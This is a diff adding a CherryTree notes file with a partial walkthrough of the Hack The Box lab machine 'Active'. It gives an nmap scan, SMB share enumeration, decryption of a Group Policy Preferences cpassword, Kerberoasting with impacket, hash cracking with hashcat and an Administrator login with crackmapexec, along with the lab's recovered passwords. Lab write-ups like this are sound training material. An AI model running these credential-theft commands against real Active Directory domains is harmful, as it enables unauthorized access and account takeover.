@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Active" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696088686" ts_lastsave="1696091101">
+    <rich_text>Nmap scan report for 10.129.92.7
+Host is up, received user-set (0.059s latency).
+Scanned at 2023-09-30 11:43:48 EDT for 150s
+Not shown: 65513 closed tcp ports (reset)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-09-30 15:44:55Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Aggressive OS guesses: Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (95%), Microsoft Windows Windows 7 SP1 (95%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (95%), Microsoft Windows Vista SP1 (95%), Microsoft Windows 7 SP1 (95%), Microsoft Windows 7 SP1 or Windows Server 2008 (93%), Microsoft Windows 7 Ultimate (93%), Microsoft Windows 8.1 (93%), Microsoft Windows 8 (93%), Microsoft Windows Vista Enterprise (93%)
+No exact OS matches for host (If you know what OS is running on it, see </rich_text>
+    <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
+    <rich_text> ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94%E=4%D=9/30%OT=53%CT=1%CU=32999%PV=Y%DS=2%DC=T%G=Y%TM=651842C
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=
+OS:7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M5
+OS:3CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
+OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
+OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
+OS:)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%
+OS:A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIP
+OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+</rich_text>
+    <node name="Enumeration" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696088690" ts_lastsave="1696089533">
+      <rich_text>We find the following shares:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+On </rich_text>
+      <rich_text weight="heavy">Replication</rich_text>
+      <rich_text> share, we will find this path: </rich_text>
+      <rich_text style="italic">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\</rich_text>
+      <rich_text>, where we will find </rich_text>
+      <rich_text weight="heavy">Groups.xml</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+After some reasearch, we find out that the </rich_text>
+      <rich_text weight="heavy">cpassword</rich_text>
+      <rich_text> can be decrypted using </rich_text>
+      <rich_text weight="heavy">gpp-decrpyt</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <codebox char_offset="30" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      </codebox>
+      <codebox char_offset="199" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;
+&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+name="active.htb\SVC_TGS" image="2"
+changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;
+&lt;Properties action="U" newName="" fullName="" description=""
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
+userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;
+&lt;/Groups&gt;</codebox>
+      <codebox char_offset="291" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+GPPstillStandingStrong2k18</codebox>
+    </node>
+    <node name="Exploit" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696088695" ts_lastsave="1696091663">
+      <rich_text>We can Kerberoast:
+
+And get </rich_text>
+      <rich_text weight="heavy">Administrator</rich_text>
+      <rich_text> hash.
+We can crack it:
+
+
+And we will get:
+
+
+Then we can get into machine:
+</rich_text>
+      <codebox char_offset="19" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.129.92.7 active.htb/svc_tgs -outputfile hashes.kerberoast</codebox>
+      <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt</codebox>
+      <codebox char_offset="86" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Administrator:Ticketmaster1968</codebox>
+      <codebox char_offset="119" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.129.92.7 -u "Administrator" -p "Ticketmaster1968"</codebox>
+    </node>
+    <node name="Privilege Escalation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696088701" ts_lastsave="1696088701"/>
+  </node>
+</cherrytree>
